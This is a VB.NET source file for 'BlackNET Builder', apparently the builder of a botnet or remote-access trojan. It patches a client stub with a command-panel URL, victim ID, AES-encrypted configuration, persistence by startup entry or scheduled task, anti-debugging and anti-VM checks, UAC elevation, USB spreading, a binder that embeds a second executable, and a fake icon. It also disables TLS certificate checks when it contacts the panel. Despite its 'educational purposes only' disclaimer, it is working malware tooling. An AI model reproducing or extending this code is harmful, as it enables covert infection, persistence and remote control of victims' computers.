Imports System.Security.Cryptography
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Net
Imports System.Text

' - - - - - - - - - - -
' BlackNET Builder
' v3.6.0.0
' Developed by: Black.Hacker
' Tnx to: NYANxCAT, KFC, 0xfd.
' - - - - - - - - - - -
Public Class Main
    Dim dialog As New SaveFileDialog
    Dim a As New OpenFileDialog
    Public trd As System.Threading.Thread
    Public st As Integer = 0
    Public BinderPath As String = ""
    Public dropPath As String = ""
    Public dropName As String = ""
    Public backupURL As String = ""
    Dim EncryptionKey As New StringBuilder
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Function Randomisi2(ByVal lenght As Integer, ByVal charc As String) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = charc.ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub MUTEX_MouseMove(sender As Object, e As MouseEventArgs) Handles MUTEX.MouseMove
        MUTEX.Text = "BN[xxxxxx-123456]".Replace("xxxxxx", Randomisi2(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")).Replace("123456", Randomisi2(7, "1234567890"))
    End Sub
    Private Sub CompileAgent_Click(sender As Object, e As EventArgs) Handles CompileAgent.Click
        If Not File.Exists((Path.Combine(Application.StartupPath, "stub.exe"))) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        ElseIf (PanelURL.Text = "") Then
            Interaction.MsgBox("Please Enter Your BlackNET Panel URL.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly(Path.Combine(Application.StartupPath, "stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[HOST]") Then
                                            If EnableAES.Checked Then
                                                current.Operand = AES_Encrypt(PanelURL.Text, EncryptionKey.ToString)
                                            Else
                                                current.Operand = PanelURL.Text
                                            End If
                                        Else

                                            If (str = "[ID]") Then
                                                current.Operand = VictimID.Text
                                            End If

                                            If (str = "[StartupName]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Path.Combine(Application.StartupPath, "stub.exe")))
                                            End If

                                            If (str = "[MUTEX]") Then
                                                current.Operand = MUTEX.Text
                                            End If

                                            If (str = "[Splitter]") Then
                                                current.Operand = DataSplitter.Text
                                            End If

                                            If (str = "[Watcher_Status]") Then
                                                current.Operand = Watchdog.Checked.ToString
                                            End If

                                            If (Watchdog.Checked = True) Then
                                                If (str = "[Watcher_Bytes]") Then
                                                    current.Operand = Convert.ToBase64String(IO.File.ReadAllBytes("watcher.exe"))
                                                End If
                                            Else
                                                If (str = "[Watcher_Bytes]") Then
                                                    current.Operand = ""
                                                End If
                                            End If

                                            If (str = "[Install_Path]") Then
                                                current.Operand = InstallPath.Text
                                            End If

                                            If (str = "[Install_Name]") Then
                                                current.Operand = FileName.Text
                                            End If

                                            If (str = "[Startup]") Then
                                                current.Operand = Startup.Checked.ToString
                                            End If


                                            If (str = "[BypassSCP]") Then
                                                current.Operand = AntiDebugging.Checked.ToString
                                            End If

                                            If (str = "[AntiVM]") Then
                                                current.Operand = BypassVM.Checked.ToString
                                            End If

                                            If (str = "[HardInstall]") Then
                                                current.Operand = StealthMode.Checked.ToString
                                            End If

                                            If (str = "[USBSpread]") Then
                                                current.Operand = USBSpread.Checked.ToString
                                            End If

                                            If (str = "[AESKey]") Then
                                                current.Operand = EncryptionKey.ToString
                                            End If

                                            If (str = "[EncStatus]") Then
                                                current.Operand = EnableAES.Checked.ToString
                                            End If

                                            If (str = "[Added_SchTask]") Then
                                                current.Operand = SchTask.Checked.ToString
                                            End If

                                            If (str = "[ElevateUAC]") Then
                                                current.Operand = ElevateUAC.Checked.ToString
                                            End If

                                            If (str = "[DebugMode]") Then
                                                current.Operand = DebugMode.Checked.ToString
                                            End If

                                            If (str = "[DelayBool]") Then
                                                current.Operand = DelayExecution.Checked.ToString
                                            End If

                                            If (str = "[SleepTime]") Then
                                                current.Operand = ExecutionDelayTime.Text
                                            End If

                                            If (str = "[BinderStatus]") Then
                                                current.Operand = EnableBinder.Checked.ToString
                                            End If


                                            If EnableBinder.Checked = True Then
                                                If (str = "[BinderBytes]") Then
                                                    current.Operand = Convert.ToBase64String(File.ReadAllBytes(BinderPath))
                                                End If
                                                If (str = "[DropperPath]") Then
                                                    current.Operand = dropPath
                                                End If
                                                If (str = "[DropperName]") Then
                                                    current.Operand = dropName
                                                End If
                                            Else
                                                If (str = "[BinderBytes]" Or str = "[DropperPath]" Or str = "[DropperName]") Then
                                                    current.Operand = ""
                                                End If
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                .InitialDirectory = Application.StartupPath
                .FileName = "Client.exe"
                .Filter = "Executable Applications (*.exe)|*.exe"
                .Title = "Choose a place to save your bot | BlackNET v" & ProductVersion
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                If ChangeIcon.Checked = True Then
                    IconChanger.InjectIcon(dialog.FileName, a.FileName)
                End If
                MsgBox("Your Client Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
        End If
    End Sub
    Public Function AES_Encrypt(ByVal plainText As String, ByVal secretKey As String) As String
        Dim encryptedPassword As Byte()
        Using outputStream As MemoryStream = New MemoryStream()
            Dim algorithm As RijndaelManaged = getAlgorithm(secretKey)
            Using cryptoStream As CryptoStream = New CryptoStream(outputStream, algorithm.CreateEncryptor(), CryptoStreamMode.Write)
                Dim inputBuffer() As Byte = Encoding.Unicode.GetBytes(plainText)
                cryptoStream.Write(inputBuffer, 0, inputBuffer.Length)
                cryptoStream.FlushFinalBlock()
                encryptedPassword = outputStream.ToArray()
            End Using
        End Using
        Return Convert.ToBase64String(encryptedPassword)
    End Function
    Private Function getAlgorithm(ByVal secretKey As String) As RijndaelManaged
        Const salt As String = "Lld6QV9qT0kkQ1dRYTk8ZEVERnNmMUZLakdNT1FyaCE3LWEtL3xdNClnVC9rQUBTTtZcT9XamwpeiwsMjY"
        Const keySize As Integer = 256

        Dim keyBuilder As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes(salt))
        Dim algorithm As RijndaelManaged = New RijndaelManaged()
        algorithm.KeySize = keySize
        algorithm.IV = keyBuilder.GetBytes(CType(algorithm.BlockSize / 8, Integer))
        algorithm.Key = keyBuilder.GetBytes(CType(algorithm.KeySize / 8, Integer))
        algorithm.Padding = PaddingMode.PKCS7
        Return algorithm
    End Function
    Public Function check_panel(Panel As String)
        Try
            Dim status As String = _GET(Panel & "/check_panel.php")
            If status.Contains("Panel Enabled") Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function _GET(ByVal Panel As String)
        Try
            Dim responseData As String = ""
            Dim URL As New Uri(Panel)
            Dim s As Net.HttpWebRequest
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
            s = HttpWebRequest.Create(URL)
            s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
            s.Method = "GET"
            Dim _Response As Net.HttpWebResponse = s.GetResponse()
            Dim responseStream As IO.StreamReader = New IO.StreamReader(_Response.GetResponseStream())
            responseData = responseStream.ReadToEnd()
            _Response.Close()
            Return responseData
        Catch ex As WebException
            Return ex.Message
        End Try
    End Function
    Public Function AcceptAllCertifications(ByVal sender As Object, ByVal certification As System.Security.Cryptography.X509Certificates.X509Certificate, ByVal chain As System.Security.Cryptography.X509Certificates.X509Chain, ByVal sslPolicyErrors As System.Net.Security.SslPolicyErrors) As Boolean
        Return True
    End Function
    Private Sub EnableAES_CheckedChanged(sender As Object) Handles EnableAES.CheckedChanged
        If EnableAES.Checked Then
            EncryptionKey.Append(ENB(Randomisi2(50, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@#$%^&*")))
        Else
            EncryptionKey.Clear()
        End If
    End Sub
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        Dim output = Convert.ToBase64String(byt)
        output = output.Split("=")(0)
        output = output.Replace("+", "-")
        output = output.Replace("/", "_")
        ENB = output
    End Function
    Private Sub ChangeIcon_CheckedChanged(sender As Object) Handles ChangeIcon.CheckedChanged
        If ChangeIcon.Checked = False Then
            If Not FileIcon.Image Is Nothing Then
                FileIcon.Image = Nothing
            End If
        Else
            With a
                .Filter = "icon File (*.ico)|*.ico"
                .Title = "Select Icon"
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    FileIcon.Image = Image.FromFile(a.FileName)
                End If
            End With
        End If
    End Sub
    Private Sub StealthMode_CheckedChanged(sender As Object) Handles StealthMode.CheckedChanged
        Select Case StealthMode.Checked
            Case True
                InstallPath.Enabled = True
                FileName.Enabled = True
            Case False
                InstallPath.Enabled = False
                FileName.Enabled = False
        End Select
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        InstallPath.SelectedItem = InstallPath.Items.Item(0)
        UpdateStatus.Text = "Version: v" & ProductVersion

        If Not My.Settings.Host = "" Then
            PanelURL.Text = My.Settings.Host
            VictimID.Text = My.Settings.ID
            MUTEX.Text = My.Settings.MUTEX
            DataSplitter.Text = My.Settings.Splitter
            FileName.Text = My.Settings.Filename
            Startup.Checked = My.Settings.Startup
            AntiDebugging.Checked = My.Settings.AntiDebug
            ElevateUAC.Checked = My.Settings.UAC
            USBSpread.Checked = My.Settings.USB
            EnableAES.Checked = My.Settings.AES
            StealthMode.Checked = My.Settings.Stealth
            Watchdog.Checked = My.Settings.Watchdog
            DebugMode.Checked = My.Settings.Debug
            SchTask.Checked = My.Settings.Schtask
            BypassVM.Checked = My.Settings.VM
        End If
    End Sub
    Private Sub CheckPanel_Click(sender As Object, e As EventArgs) Handles CheckPanel.Click
        If check_panel(PanelURL.Text) Then
            MessageBox.Show("Your Panel is Enabled.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("Your Panel is Disabled or Does not Exist.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Private Sub CheckForUpdate_Click(sender As Object, e As EventArgs) Handles CheckForUpdate.Click
        Try
            Dim DownloadVersion As New WebClient
            Dim CurrentVersion As String = ProductVersion

            Dim GitHubVersion As String = DownloadVersion.DownloadString("https://raw.githubusercontent.com/FarisCode511/BlackNET/main/version.txt")

            If (Integer.Parse(CurrentVersion.Replace(".", Nothing)) >= Integer.Parse(GitHubVersion.Replace("v", Nothing).Replace(".", Nothing))) Then
                MessageBox.Show("BlackNET is Up to Date.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)

                UpdateStatus.Text = "Up to date"
            Else
                If (MessageBox.Show("New update is available," + vbNewLine + "Do you want to download it", "Update check", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = Windows.Forms.DialogResult.Yes) Then
                    Dim DownloadUpdate As New WebClient
                    ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
                    ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
                    DownloadUpdate.DownloadFile("https://github.com/FarisCode511/BlackNET/archive/main.zip", "BlackNET - " & GitHubVersion & ".zip")

                    MessageBox.Show("Update has been downloaded please extract it", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
                UpdateStatus.Text = "New update is available."
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical + MsgBoxStyle.OkOnly, "Error")
        End Try
    End Sub
    Private Sub Startup_CheckedChanged(sender As Object) Handles Startup.CheckedChanged
        If (SchTask.Checked = True) Then
            SchTask.Checked = False
        End If
    End Sub
    Private Sub SchTask_CheckedChanged(sender As Object) Handles SchTask.CheckedChanged
        If (Startup.Checked = True) Then
            Startup.Checked = False
        End If
    End Sub
    Private Sub FlatClose1_Click(sender As Object, e As EventArgs) Handles CloseApp.Click
        If MessageBox.Show("Do you want to save your current settings?", "Close", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = Windows.Forms.DialogResult.Yes Then
            My.Settings.Host = PanelURL.Text
            My.Settings.ID = VictimID.Text
            My.Settings.MUTEX = MUTEX.Text
            My.Settings.Splitter = DataSplitter.Text
            My.Settings.Filename = FileName.Text
            My.Settings.Startup = Startup.Checked
            My.Settings.AntiDebug = AntiDebugging.Checked
            My.Settings.UAC = ElevateUAC.Checked
            My.Settings.USB = USBSpread.Checked
            My.Settings.AES = EnableAES.Checked
            My.Settings.Stealth = StealthMode.Checked
            My.Settings.Watchdog = Watchdog.Checked
            My.Settings.Debug = DebugMode.Checked
            My.Settings.Schtask = SchTask.Checked
            My.Settings.VM = BypassVM.Checked
            My.Settings.Save()
        Else
            My.Settings.Reset()
        End If
    End Sub
    Private Sub Binder_CheckedChanged(sender As Object) Handles EnableBinder.CheckedChanged
        If EnableBinder.Checked = True Then
            Binder.Show()
        End If
    End Sub

    Private Sub DelayExecution_CheckedChanged(sender As Object) Handles DelayExecution.CheckedChanged
        If DelayExecution.Checked = True Then
            ExecutionDelayTime.Enabled = True
        Else
            ExecutionDelayTime.Enabled = False
        End If
    End Sub

    Private Sub UpdateStatus_DoubleClick(sender As Object, e As EventArgs) Handles UpdateStatus.DoubleClick
        MessageBox.Show("BlackNET v" & ProductVersion & vbNewLine & vbNewLine & "Thx to: NYANxCAT, KFC, 0xfd" & vbNewLine & vbNewLine & "Copyright (c) Black.Hackr - " & DateTime.UtcNow.Year & vbNewLine & vbNewLine & "This Project is for educational purposes only." & vbNewLine & vbNewLine & "This Project is Licensed under MIT", "About BlackNET", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
End Class